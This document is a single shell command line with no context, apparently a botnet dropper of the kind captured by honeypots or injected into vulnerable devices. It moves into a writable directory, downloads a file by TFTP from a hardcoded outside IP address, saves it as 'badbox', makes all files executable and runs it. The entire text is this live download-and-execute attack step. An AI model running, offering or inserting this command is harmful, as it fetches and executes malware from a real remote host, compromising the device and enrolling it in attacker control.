cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r u65u5y45 -g 192.227.180.164;cat u65u5y45 >badbox;chmod +x *;./badbox
